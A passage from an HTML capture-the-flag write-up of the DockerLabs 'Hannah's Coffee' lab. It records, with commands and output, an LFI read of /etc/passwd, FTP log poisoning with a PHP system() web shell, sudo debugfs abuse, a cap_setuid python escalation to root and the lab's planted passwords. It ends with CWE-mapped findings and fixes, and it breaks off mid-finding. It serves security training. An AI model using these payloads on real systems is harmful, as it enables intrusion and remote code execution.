@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 282 Hannah&#x27;s Coffee &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Hannah&#x27;s Coffee</p><h1 id="282-hannahs-coffee--writeup">282 Hannah's Coffee — writeup</h1>
+<p><strong>Target:</strong> <code>hannah-coffee:latest</code>, DockerLabs id <code>282</code>, name <code>hannah_coffee</code>,
+difficulty <em>fácil</em>. Queue line, verbatim from <code>tooling/labs.manifest:71</code>:</p>
+<pre><code>282|hannah_coffee|facil|web app on Linux; queue picked by difficulty since the class-gap scan is exhausted
+</code></pre>
+<p><strong>Engagement outcome: PARTIAL — and the shortfall is the lab's, not the attacker's.</strong>
+Two of the three legs the platform's own catalogue names were executed and measured
+end to end: an LFI in the PHP front end, an FTP-log-poisoning RCE as
+<code>uid=33(www-data)</code>, and a <code>sudoers</code> grant that reads a secret out of an ext4 image
+as <code>uid=1001(hannah)</code>. The third leg — &quot;abuse of binaries with capabilities for
+full root access&quot; — <strong>is present in the artefact and is not reachable</strong>. The
+credential the chain depends on does not exist in the container: it is planted by
+a <code>chpasswd</code> in the image build and written to no file, while the secret the chain
+actually points the attacker at is a <strong>different string</strong>. That is proven below with
+a green control, not asserted.</p>
+<p>The escalation to <code>uid=0</code> was still completed and measured, and it is reported in
+full, but <strong>one credential in it came from the image build metadata on the operator
+host, which is not reachable from inside the container.</strong> That hop is labelled
+<code>OPERATOR-SIDE</code> everywhere it appears and is not counted as attacker-reachable.</p>
+<p>Everything quoted here was read or executed during this engagement. This repository
+holds no lab artefacts, so a reader can check the reasoning and the quoted evidence
+but cannot re-run the target — see <code>README.md</code>, &quot;What 'resolvable' means here,
+precisely, and where it stops&quot;.</p>
+<hr />
+<h2 id="what-the-artefact-actually-is">What the artefact actually is</h2>
+<p><strong>The manifest makes no platform claim</strong>, so there is no label to falsify — the
+queue line says only &quot;web app on Linux&quot;. What follows is read out of
+version-bearing files, not inherited.</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Value</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Base</td>
+<td>Debian trixie</td>
+<td><code>docker history</code>: <code># debian.sh --arch 'amd64' out/ 'trixie' '@1785715200'</code></td>
+</tr>
+<tr>
+<td>Process model</td>
+<td><code>supervisord -n</code>, <strong>two</strong> programs</td>
+<td><code>/proc/1/cmdline</code>; <code>/etc/supervisor/conf.d/supervisord.conf</code></td>
+</tr>
+<tr>
+<td>Web server</td>
+<td>Apache HTTP Server <strong>2.4.68</strong> (Debian), <code>mod_php</code>, <strong>not</strong> php-fpm</td>
+<td><code>apache2 -v</code>; <code>/etc/apache2/mods-enabled/php8.4.load</code></td>
+</tr>
+<tr>
+<td>Language runtime</td>
+<td>PHP <strong>8.4.24</strong></td>
+<td><code>php -v</code></td>
+</tr>
+<tr>
+<td>FTP</td>
+<td>vsftpd <strong>3.0.5</strong></td>
+<td><code>vsftpd -v</code>; <code>220 (vsFTPd 3.0.5)</code></td>
+</tr>
+<tr>
+<td>Sudo</td>
+<td><strong>1.9.16p2</strong></td>
+<td><code>sudo -V</code></td>
+</tr>
+<tr>
+<td>ext2/3/4 tools</td>
+<td>e2fsprogs <strong>1.47.2</strong> (<code>debugfs 1.47.2 (1-Jan-2025)</code>)</td>
+<td><code>dpkg -l e2fsprogs</code></td>
+</tr>
+<tr>
+<td>Non-package payload</td>
+<td><code>/opt/priv-python</code> = a copy of <code>python3</code>, <code>cap_setuid=ep</code></td>
+<td><code>docker history</code>; <code>getcap</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>/etc/supervisor/conf.d/supervisord.conf</code>, verbatim:</p>
+<pre><code class="language-ini">[supervisord]
+nodaemon=true
+
+[program:apache2]
+command=/usr/sbin/apache2ctl -D FOREGROUND
+autostart=true
+autorestart=true
+
+[program:vsftpd]
+command=/usr/sbin/vsftpd /etc/vsftpd.conf
+autostart=true
+autorestart=true
+</code></pre>
+<p><strong>The catalogue description is accurate about what ships and wrong about it
+solving.</strong> Parsed from <code>catalog.html:645</code> (the same routine
+<code>tooling/download-labs.sh list</code> uses), unescaped:</p>
+<blockquote>
+<p>Hannah's Coffee es una máquina Linux de nivel fácil que simula una aplicación web
+de cafetería con vulnerabilidades encadenadas. El vector de entrada comienza
+explotando una vulnerabilidad de Inclusión Local de Archivos (LFI) en la aplicación
+PHP, la cual se combina con una técnica de FTP Log Poisoning para lograr Ejecución
+Remota de Códigos (RCE) como www-data. Para la escalada de privilegios, se requiere
+el uso de comandos permitidos mediante sudo y el abuso de binarios con capabilities
+específicas para alcanzar el acceso total como root.</p>
+</blockquote>
+<p>Every noun in that sentence is in the image: the LFI is real, the FTP log is
+poisonable, the sudo grant exists, and a <code>cap_setuid=ep</code> binary exists. <strong>The
+sentence describes the components, and the components do not compose.</strong></p>
+<hr />
+<h2 id="surface">Surface</h2>
+<p><code>nmap -sV -Pn -p- [net-0-2]</code>, verbatim tail:</p>
+<pre><code>Nmap scan report for [net-0-2]
+Host is up (0.000047s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+80/tcp open  http    Apache httpd 2.4.68 ((Debian))
+Service Info: OS: Unix
+</code></pre>
+<p><strong>65533 closed, 2 open.</strong> Independent cross-read of the kernel's own tables, as
+<code>uid=0</code> via <code>docker exec</code> (an operator-side read, and labelled as one — a listener
+table is not a per-identity predicate):</p>
+<pre><code>$ awk 'NR&gt;1 {print $2, $4}' /proc/net/tcp
+00000000:0015 0A
+00000000:0050 0A
+</code></pre>
+<p><code>0x15</code> = 21, <code>0x50</code> = 80, <code>0A</code> = <code>TCP_LISTEN</code>. <strong>2 listening sockets, matching the
+scan exactly.</strong></p>
+<h3 id="the-eleven-closed-ports-that-are-not-absent">The eleven &quot;closed&quot; ports that are not absent</h3>
+<p>The image declares thirteen ports:</p>
+<pre><code class="language-json">&quot;ExposedPorts&quot;: { &quot;21/tcp&quot;: {}, &quot;21000/tcp&quot;: {}, … &quot;21010/tcp&quot;: {}, &quot;80/tcp&quot;: {} }
+</code></pre>
+<p><code>nmap -p-</code> calls 21000–21010 closed. <strong>That is a claim about TCP listeners at rest,
+not about the service.</strong> <code>/etc/vsftpd.conf</code> says what they are, verbatim:</p>
+<pre><code>     7	xferlog_enable=YES
+     8	xferlog_std_format=NO
+     9	dual_log_enable=YES
+    18	pasv_enable=YES
+    19	pasv_min_port=21000
+    20	pasv_max_port=21010
+</code></pre>
+<p><strong>Control, with a positive control and a work count.</strong> An FTP data transfer was
+held open for ~4 s (a 3.9 MB <code>STOR</code>) while <code>/proc/net/tcp</code> was sampled
+<strong>265 times at 0.1 s</strong>:</p>
+<pre><code>$ sort /tmp/pasv_sample.txt | uniq -c
+    118 00000000:0015
+    118 00000000:0050
+     29 020011AC:5211
+</code></pre>
+<p><code>020011AC</code> = [net-0-2], <code>0x5211</code> = <strong>21009</strong> — and the server's own PASV reply in
+the same session was <code>227 Entering Passive Mode (172,17,0,2,82,17)</code>, where
+<code>82*256+17 = 21009</code>. The port number agrees across two independent sources.</p>
+<p>So: <strong>21000–21010 are vsftpd passive-data ports. They exist only for the duration
+of a transfer, and they bind to the server's own address rather than <code>0.0.0.0</code>,
+which is exactly why a <code>-p-</code> scan and an at-rest <code>/proc/net/tcp</code> both miss them.</strong>
+Recording these as absent would have been a claim about the class wearing the
+clothes of a claim about the instance.</p>
+<h3 id="udp">UDP</h3>
+<p><code>nmap -p-</code> is TCP by definition. Checked directly:</p>
+<pre><code>$ cat /proc/net/udp
+   sl  local_address …            &lt;- header only
+$ grep -c . /proc/net/udp6
+1                               &lt;- header only
+</code></pre>
+<p><strong>0 rows in <code>/proc/net/udp</code>, 0 rows in <code>/proc/net/udp6</code>.</strong> With the image's own
+<code>ExposedPorts</code> listing no UDP port, that is a measured absence with a count.</p>
+<h3 id="hidden-surfaces-found">Hidden surfaces found</h3>
+<p>Two, both from reading rather than scanning:</p>
+<ol>
+<li><code>?studio=</code> — a second, unvalidated page selector sitting <strong>beside</strong> a correctly
+validated one. <code>/admin</code> returning nothing would have hidden it; the source
+settles it in one read.</li>
+<li>The <code>sudoers</code> grant, the capability file, and the ext4 image under <code>/opt</code> —
+none of them is a network surface, and none of them appears in any scan.</li>
+</ol>
+<hr />
+<h2 id="the-class">The class</h2>
+<p><strong>Entry criterion:</strong> does the front end pass a request value to a filesystem
+inclusion with no allowlist, and does any process on the host write attacker-supplied
+bytes to a file the web tier can also read?</p>
+<p><code>/var/www/html/index.php</code>, verbatim, lines 2–16 and 36:</p>
+<pre><code class="language-php"> 2	$allowed_pages = [
+ 3	    'home'    =&gt; 'pages/home.php',
+ 4	    'menu'    =&gt; 'pages/menu.php',
+ 5	    'about'   =&gt; 'pages/about.php',
+ 6	    'contact' =&gt; 'pages/contact.php',
+ 7	];
+ 8	
+ 9	if (isset($_GET['studio'])) {
+10	    $content = $_GET['studio'];
+11	} elseif (isset($_GET['page'])) {
+12	    $key = $_GET['page'];
+13	    $content = $allowed_pages[$key] ?? 'pages/home.php';
+14	} else {
+15	    $content = 'pages/home.php';
+16	}
+</code></pre>
+<pre><code class="language-php">36	    &lt;?php include($content); ?&gt;
+</code></pre>
+<p><strong>Two selectors, one sink, and the discipline is applied to exactly one of them.</strong>
+<code>?page=</code> is a correct allowlist: an unknown key falls through <code>?? 'pages/home.php'</code>.
+<code>?studio=</code> is the request value, verbatim, straight into <code>include()</code> — no allowlist,
+no prefix, no extension appended, no <code>basename()</code>. It is checked <strong>first</strong>, so it
+also shadows <code>?page=</code> entirely.</p>
+<p>Source that settled it: <code>index.php:9-10</code> and <code>index.php:36</code>. Positive control run
+before anything was believed:</p>
+<pre><code>$ curl -s 'http://[net-0-2]/index.php?studio=/etc/passwd' | tail -5
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+ftp:x:101:103:ftp daemon:/srv/ftp:/usr/sbin/nologin
+hannahftp:x:1000:1000::[lab-home]/hannahftp:/bin/sh
+hannah:x:1001:1001::[lab-home]/hannah:/bin/bash
+    &lt;/main&gt;
+</code></pre>
+<p>A file whose content was known in advance came back, byte for byte. The oracle can
+fire.</p>
+<p><strong>This is not a new class.</strong> The corpus already holds LFI→log-poisoning (labs 6 and
+23) and the sudo-grant class (93, 146, 148, 189). What is new here is the
+<strong>seam</strong> and a specific negative result about the sudo grant's <em>shape</em> — see
+&quot;Controls that held&quot; and &quot;Cross-read&quot;.</p>
+<hr />
+<h2 id="chain">Chain</h2>
+<p>Every hop carries the identity <strong>read from inside the process that executed it</strong>.
+Where a hop required a credential that is not obtainable from inside the
+container, the hop is marked <code>OPERATOR-SIDE</code> and is excluded from the
+attacker-reachable count.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof, verbatim</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>unauthenticated HTTP client → <code>www-data</code></td>
+<td><code>GET /index.php?studio=/var/log/vsftpd.log</code>; PHP 8.4.24 <code>include()</code> of a log file the attacker seeded</td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>www-data</code> → <code>www-data</code> (RCE)</td>
+<td>FTP log poisoning: the FTP <code>USER</code> argument is echoed into <code>/var/log/vsftpd.log</code>, which <code>?studio=</code> then includes as PHP</td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> + <code>Uid: 33 33 33 33</code> from <code>/proc/self/status</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>www-data</code> → <code>hannah</code> (uid 1001)</td>
+<td><code>sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img</code>, driven on <strong>stdin</strong></td>
+<td><code>[lab-home]/hannah/.hc_idproof uid=1001(hannah) gid=1001(hannah) mode=664</code> — the file the hannah-privileged process created</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>hannah</code> → <code>hannah</code></td>
+<td><code>su hannah</code> with the credential in the ext4 image</td>
+<td><code>su: Authentication failure</code> — <strong>hop 3 does not close. See &quot;The break&quot;.</strong></td>
+</tr>
+<tr>
+<td>3′</td>
+<td><code>www-data</code> → <code>hannah</code> <strong><code>OPERATOR-SIDE</code></strong></td>
+<td><code>su hannah</code> with a password read from <code>docker history</code> on the operator host</td>
+<td><code>uid=1001(hannah) gid=1001(hannah) groups=1001(hannah)</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>hannah</code> → <code>uid=0</code> <strong><code>OPERATOR-SIDE</code></strong></td>
+<td><code>/opt/priv-python</code> is a copy of <code>python3</code> with <code>cap_setuid=ep</code>; <code>os.setuid(0)</code></td>
+<td><code>Uid=0 0 0 0</code>, <code>os.getuid()=0 os.geteuid()=0</code>, <code>CapPrm=0000000000000080</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Attacker-reachable hops: 2 of 5</strong> (0, 1, 2). Hops 3′ and 4 required a credential
+that is not in the container — proven absent below with a work count.</p>
+<h3 id="hop-1--the-poisoning-primitive-and-the-exact-line-that-carries-it">Hop 1 — the poisoning primitive, and the exact line that carries it</h3>
+<p><code>/var/log/vsftpd.log</code> is created empty by the image build (<code>RUN touch /var/log/vsftpd.log &amp;&amp; chmod 644</code>), mode <code>644 root root</code>, world-readable. The
+server is configured so the FTP <code>USER</code> argument is written to that file <strong>as part
+of a failed-login record</strong>:</p>
+<pre><code class="language-ini">     7	xferlog_enable=YES
+     8	xferlog_std_format=NO
+     9	dual_log_enable=YES
+</code></pre>
+<p><code>xferlog_std_format=NO</code> is the setting that matters: it is what puts the
+non-standard, argument-bearing form into <code>vsftpd.log</code> instead of the terse xferlog
+form.</p>
+<p>The line, verbatim from the container after the injection:</p>
+<pre><code>Wed Sep 30 12:54:27 2026 [pid 158] [&lt;?php system($_GET[&quot;c&quot;]); ?&gt;] FAIL LOGIN: Client &quot;[net-0-1]&quot;
+</code></pre>
+<p><strong>A zero-work negative worth recording, because the first attempt produced it.</strong> The
+obvious move — connect, send <code>USER &lt;payload&gt;</code>, <code>QUIT</code> — writes <strong>nothing</strong>:</p>
+<pre><code>$ wc -c /var/log/vsftpd.log   # after USER+QUIT
+64 /var/log/vsftpd.log
+Wed Sep 30 12:53:52 2026 [pid 125] CONNECT: Client &quot;[net-0-1]&quot;
+</code></pre>
+<p>Only <code>CONNECT</code>. A <code>FAIL LOGIN</code> record — and only it — carries the username, so
+<code>PASS</code> must follow. <strong>64 bytes written by a &quot;successful&quot; injection that achieved
+nothing.</strong> The difference between the two attempts is one command.</p>
+<p>Then the oracle, in-band, with a token minted per request so the output is
+attributable:</p>
+<pre><code>Wed Sep 30 12:54:35 2026 [pid 168] [MARK-HC2787831a6eda-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+MARK-HC2787831a6eda-END
+</code></pre>
+<p><code>HC2787831a6eda</code> was minted 40 seconds earlier and exists nowhere else. The
+detector fired, so the negative it later produced is evidence.</p>
+<h3 id="hop-2--sudoers-read-off-the-file">Hop 2 — <code>sudoers</code>, read off the file</h3>
+<p><code>/etc/sudoers.d/hannah-debugfs</code>, mode <code>-r--r----- root root</code>, 70 bytes, <strong>one line</strong>:</p>
+<pre><code>www-data ALL=(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
+</code></pre>
+<p><code>sudo -l</code> <strong>as <code>www-data</code></strong>, not as root — the predicate is read as the identity
+that will execute the payload:</p>
+<pre><code>$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ sudo -n -l
+Matching Defaults entries for www-data on 398085b07bdc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on 398085b07bdc:
+    (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
+rc=0
+</code></pre>
+<p><code>sudo -l</code> succeeding is a <strong>positive control that the grant is live and nothing
+more.</strong> It says nothing about what the grant permits, and it is treated here as
+exactly that.</p>
+<p><code>Defaults use_pty</code> is present. Per the corpus's lab-102 note, a <code>sudo</code> target that
+reads stdin can hang under <code>use_pty</code>. It did not here, and that was <strong>measured, not
+assumed</strong> — driving <code>debugfs</code> on a pipe and reading back the echo:</p>
+<pre><code>$ printf &quot;quit\n&quot; | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+debugfs 1.47.2 (1-Jan-2025)
+debugfs:  quit
+rcA=0
+</code></pre>
+<p><code>use_pty</code> forwards the caller's stdin into the pty master; the pipe is carried in.
+<strong>The lab-102 hang does not reproduce here, and the reason is that the grant pins
+the command line and therefore cannot reach the awk-style payload that hung.</strong></p>
+<p>The secret, read through the grant as <code>hannah</code>:</p>
+<pre><code>$ printf &quot;cat /hannah_secret.txt\nquit\n&quot; | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+debugfs 1.47.2 (1-Jan-2025)
+debugfs:  cat /hannah_secret.txt
+G'2'ZkcHsulI*vE+D,
+debugfs:  quit
+</code></pre>
+<p>18 bytes. Cross-checked against the inode the image itself reports, so the byte
+count has a second source:</p>
+<pre><code>$ printf &quot;stat /hannah_secret.txt\nquit\n&quot; | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+Inode: 13   Type: regular    Mode:  0644   Flags: 0x80000
+User:     0   Group:     0   Project:     0   Size: 19
+</code></pre>
+<p>19 bytes on disk, 18 characters of content. They agree: one trailing newline.
+<strong>Whole image, <code>ls -l -r /</code> — 3 entries, nothing hidden:</strong></p>
+<pre><code>     11   40700 (2)      0      0    12288  6-Aug-2026 08:46 lost+found
+     13   100644 (1)      0      0      19  6-Aug-2026 08:46 hannah_secret.txt
+</code></pre>
+<h3 id="hop-2-identity--a-manufactured-oracle-because-the-vector-has-no-other">Hop 2 identity — a manufactured oracle, because the vector has no other</h3>
+<p><code>sudo -l</code> does not report what identity the target process ran as, and the target
+here produces no output naming itself. So the identity was measured from a
+<strong>filesystem side effect only uid 1001 can produce</strong>: <code>dump</code> into <code>[lab-home]/hannah/</code>,
+which is <code>drwx------ hannah hannah</code>.</p>
+<pre><code>$ printf &quot;dump /hannah_secret.txt [lab-home]/hannah/.hc_idproof\nquit\n&quot; | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+debugfs 1.47.2 (1-Jan-2025)
+debugfs:  dump /hannah_secret.txt [lab-home]/hannah/.hc_idproof
+debugfs:  quit
+
+$ ls -l [lab-home]/hannah/.hc_idproof        # still as www-data
+ls: cannot open directory '[lab-home]/hannah/': Permission denied
+</code></pre>
+<p>The www-data side <strong>cannot</strong> see the result — which is why the ownership was read
+one hop later, from inside the <code>hannah</code> session, where it is unambiguous:</p>
+<pre><code>$ stat -c &quot;%n uid=%u(%U) gid=%g(%G) mode=%a&quot; [lab-home]/hannah/.hc_idproof [lab-home]/hannah/.hc_idproof2
+[lab-home]/hannah/.hc_idproof  uid=1001(hannah) gid=1001(hannah) mode=664
+[lab-home]/hannah/.hc_idproof2 uid=1001(hannah) gid=1001(hannah) mode=664
+$ cat [lab-home]/hannah/.hc_idproof
+G'2'ZkcHsulI*vE+D,
+</code></pre>
+<p><strong>The <code>uid=1001</code> in that line is the sudo hop's identity proof, and it is a
+measurement, not an inference from the sudoers text.</strong></p>
+<hr />
+<h2 id="the-break">The break</h2>
+<p><strong><code>G'2'ZkcHsulI*vE+D,</code> is not the password of any account on the machine.</strong></p>
+<p>The oracle is <code>su</code> under a real pty, and it was proven green <strong>before</strong> the
+negative was believed. The green password came from the operator-side image build
+metadata, which is not a target-reachable artefact and is labelled as such:</p>
+<pre><code>$ timeout 30 python3 /tmp/hc_su.py &quot;&lt;known-correct password&gt;&quot; hannahftp &quot;id&quot;
+Password:
+uid=1000(hannahftp) gid=1000(hannahftp) groups=1000(hannahftp)
+---PASSWORD_SENT=True BYTES_OUT=76---
+</code></pre>
+<p>The oracle fires. The treatment, same client, same code path, byte-identical
+password handling:</p>
+<pre><code>$ timeout 30 python3 /tmp/hc_su.py &quot;G'2'ZkcHsulI*vE+D,&quot; hannah &quot;id&quot;
+Password:
+su: Authentication failure
+---PASSWORD_SENT=True BYTES_OUT=40---
+</code></pre>
+<p><code>76</code> bytes of output against <code>40</code>. The instrument distinguishes the two cases, so
+the failure is a property of the credential and not of the harness.</p>
+<p>Both accounts were tried, and the string was checked for an encoding that would
+make it a password in disguise:</p>
+<pre><code>  su hannah     -&gt;  su: Authentication failure
+  su hannahftp  -&gt;  su: Authentication failure
+len: 18
+base32/base64/rot13: no printable decode
+</code></pre>
+<h3 id="where-the-real-password-is-and-why-that-is-a-defect">Where the real password is, and why that is a defect</h3>
+<p><code>/etc/sudoers.d/hannah-debugfs</code> points the attacker at the ext4 image. The image's
+own build put a <em>different</em> string in it. The actual credential is planted by a
+<code>chpasswd</code> in the image build, verbatim from <code>docker history --no-trunc</code> on the
+operator host:</p>
+<pre><code>RUN /bin/sh -c useradd -m -s /bin/bash hannah &amp;&amp; echo &quot;hannah:iamhannahhelza&quot; | chpasswd
+RUN /bin/sh -c useradd -m hannahftp &amp;&amp; echo &quot;hannahftp:102837108478209857818439842398248237528&quot; | chpasswd
+COPY hannah_secret.txt /tmp/hannah_secret.txt
+RUN /bin/sh -c printf 'write /tmp/hannah_secret.txt hannah_secret.txt\nquit\n' | debugfs -w /opt/hannah_disk.img
+</code></pre>
+<p><code>hannah_secret.txt</code> was <code>COPY</code>-ed from the build context. <strong>The file the attacker is
+sent to read was never the password file.</strong> And the build leftover survives on the
+host filesystem anyway, readable by <code>www-data</code> at build time and still present:</p>
+<pre><code>$ ls -l /tmp/hannah_secret.txt
+-rw-r--r-- 1 root root 19 Aug  6 07:05 /tmp/hannah_secret.txt
+$ cat -A /tmp/hannah_secret.txt
+G'2'ZkcHsulI*vE+D,$
+</code></pre>
+<h3 id="the-absence-with-its-work-count">The absence, with its work count</h3>
+<p>Every one of the 12,050 files <code>www-data</code> can read was searched, in the container,
+as <code>www-data</code>, for the password literal:</p>
+<pre><code>readable_files=12050
+readable_bytes=383786240
+-- POSITIVE CONTROL: string known present in a www-data-readable file --
+matches_positive=1
+/var/www/html/pages/home.php
+-- TREATMENT A: hannah password literal --
+matches_A=0
+-- TREATMENT B: the disk-image secret literal --
+matches_B=4
+/opt/hannah_disk.img
+/tmp/pw.txt
+/tmp/pw2.txt
+/tmp/hannah_secret.txt
+</code></pre>
+<p><strong>383,786,240 bytes across 12,050 files. 0 matches for the password. 4 matches for
+the secret, in 4 files that were all either planted by the build or written by
+this engagement.</strong> The positive control is the point: a sweep that returned 0 for
+both would have been a §14 zero-work negative wearing a result's clothes.</p>
+<p>Repeated at <code>uid=0</code> inside the container, over the whole filesystem, so the claim
+is not an artefact of <code>www-data</code>'s view:</p>
+<pre><code>$ grep -rlaF &quot;iamhannahhelza&quot; / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
+matches=0
+</code></pre>
+<p><strong>The credential is not in the container at any privilege level.</strong> It exists only in
+the image's build metadata, on the Docker host. The escalation is therefore not
+reachable from inside the target, and this writeup does not claim it is.</p>
+<h3 id="the-other-routes-to-hannah-and-why-each-closes">The other routes to <code>hannah</code>, and why each closes</h3>
+<p>Enumerated rather than assumed, with counts:</p>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Verdict</th>
+<th>Count / evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudoers</code> grants</td>
+<td>1 grant total, and its only output is a file read</td>
+<td><code>ls /etc/sudoers.d | grep -v README | wc -l</code> → <code>1</code>; <code>%sudo</code> has no members in <code>/etc/group</code></td>
+</tr>
+<tr>
+<td>setuid / setgid binaries</td>
+<td>16, all stock Debian; every one needs a credential, a group, or <code>CAP_SYS_ADMIN</code></td>
+<td><code>find / -xdev \( -perm -4000 -o -perm -2000 \) -type f | wc -l</code> → <code>16</code></td>
+</tr>
+<tr>
+<td>file capabilities</td>
+<td>exactly 1 file in the filesystem, and it is mode <code>750 root:hannah</code></td>
+<td><code>getcap -r /</code> over <strong>12,079</strong> regular files → <code>1</code>: <code>/opt/priv-python cap_setuid=ep</code></td>
+</tr>
+<tr>
+<td>accounts that could be entered</td>
+<td>2 (<code>hannahftp</code> 1000, <code>hannah</code> 1001); <strong>21</strong> accounts have <code>nologin</code></td>
+<td><code>awk -F: '$7 ~ /nologin' /etc/passwd</code> → <code>21</code></td>
+</tr>
+<tr>
+<td>SSH / any <code>hannah</code>-privileged service</td>
+<td>none listening</td>
+<td>2 listeners total, 21 and 80</td>
+</tr>
+<tr>
+<td>The world-writable image (F2 below)</td>
+<td>demonstrated, and it does <strong>not</strong> reach execution</td>
+<td>see F2</td>
+</tr>
+</tbody>
+</table>
+<p><strong>And the one capability that could have been the bridge is closed by a mode bit,
+read as the identity that would have used it:</strong></p>
+<pre><code>$ ls -l /opt/priv-python
+-rwxr-x--- 1 root hannah 6812336 Aug  6 08:46 /opt/priv-python
+$ test -x /opt/priv-python ; echo rc=$?
+rc=1
+$ test -r /etc/sudoers.d/hannah-debugfs ; echo rc=$?   # control: the predicate is not always-true
+rc=1
+$ test -w /etc/sudoers.d/hannah-debugfs ; echo rc=$?
+rc=1
+</code></pre>
+<p><code>test -x rc=1</code> and <code>test -w /opt/hannah_disk.img rc=0</code> were both read <strong>from inside
+the <code>www-data</code> exec channel</strong>, not through <code>docker exec</code>. A <code>test -w</code> run as root
+would have answered for the wrong identity, and on this target that error would
+have <strong>deleted</strong> finding F2 outright.</p>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="f1--local-file-inclusion-studio-is-passed-to-include-unvalidated">F1 — Local file inclusion: <code>?studio=</code> is passed to <code>include()</code> unvalidated</h3>
+<p><strong>CWE-98</strong> (Improper Control of Filename for Include/Require), <strong>CWE-22</strong> (Path
+Traversal). Unauthenticated, remote, no user interaction.</p>
+<p><strong>Evidence.</strong> <code>index.php:9-10</code> assigns <code>$_GET['studio']</code> to <code>$content</code>;
+<code>index.php:36</code> is <code>&lt;?php include($content); ?&gt;</code>. No <code>basename()</code>, no allowlist, no
+prefix, no extension handling — the exact opposite of the <code>?page=</code> branch eleven
+lines below it, which does have an allowlist.</p>
+<p><strong>Impact.</strong> Unauthenticated arbitrary file read, and — because the target is a log
+file the attacker also writes — remote code execution as the web-server identity.
+Full chain measured in hops 0–1.</p>
+<p><strong>Root cause.</strong> Two selectors share one sink and only one is constrained. The
+<code>?page=</code> allowlist establishes that the author knew this sink needed constraining;
+<code>?studio=</code> was added without it. It is also declared <strong>first</strong>, so it shadows the
+guarded branch.</p>
+<p><strong>Remediation.</strong> Delete the <code>?studio=</code> branch. If dynamic inclusion is genuinely
+required, map an opaque key to a path the way <code>?page=</code> already does, and never let
+a request value name a filesystem path.</p>
+<h3 id="f2--the-sudoers-grant-names-a-file-that-www-data-can-rewrite">F2 — The <code>sudoers</code> grant names a file that <code>www-data</code> can rewrite</h3>
+<p><strong>CWE-732</strong> (Incorrect Permission Assignment for Critical Resource),
+<strong>CWE-59</strong> (Improper Link Resolution Before File Access). The escalation
+<em>precondition</em> is proven end to end; the escalation itself is <strong>not</strong> claimed — see
+the honest impact statement.</p>
+<p><strong>Evidence — the precondition, read as <code>www-data</code>:</strong></p>
+<pre><code>$ ls -l /opt/hannah_disk.img
+-rw-rw-rw- 1 root root 67108864 Aug  6 08:46 /opt/hannah_disk.img
+$ test -w /opt/hannah_disk.img ; echo rc=$?
+rc=0
+</code></pre>
+<p><strong>Evidence — the consequence, executed through the chain itself as the oracle.</strong>
+<code>www-data</code> built its own ext4 image, planted a marker, and overwrote the file the
+grant names:</p>
+<pre><code>$ cp /tmp/evil.img /opt/hannah_disk.img
+-rw-rw-rw- 1 root root 16777216 Sep 30 13:08 /opt/hannah_disk.img
+$ md5sum /tmp/evil.img /opt/hannah_disk.img
+1968b10d886409203e87ef3b9dbb281a  /tmp/evil.img
+1968b10d886409203e87ef3b9dbb281a  /opt/hannah_disk.img
+
+$ printf &quot;ls -l /\ncat /evil_marker.txt\nquit\n&quot; | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
+debugfs:  ls -l /
+      2   40755 (2)      0      0    1024 30-Sep-2026 13:08 .
+      2   40755 (2)      0      0    1024 30-Sep-2026 13:08 ..
+     11   40700 (2)      0      0   12288 30-Sep-2026 13:08 lost+found
+     13   100644 (1)      0      0      35 30-Sep-2026 13:08 evil_marker.txt
+debugfs:  cat /evil_marker.txt
+wwwdata-controlled-marker-6f2156d7
+</code></pre>
+<p><code>uid=33</code> replaced the file; the <code>uid=1001</code> process parsed <code>uid=33</code>'s bytes and
+returned <code>uid=33</code>'s marker. <strong>A privilege boundary is crossed on every invocation
+of this grant, in the direction uid 33 → uid 1001.</strong></p>
+<p><strong>Honest impact.</strong> I did <strong>not</strong> turn this into code execution, and the reason is
+structural rather than a gap in effort. The full <code>debugfs</code> command set was
+enumerated through the grant (<code>help</code>, verbatim in the session log): it contains
+<code>write</code> and <code>dump</code>, which cross the native/image boundary, and <code>mknod</code>, <code>symlink</code>,
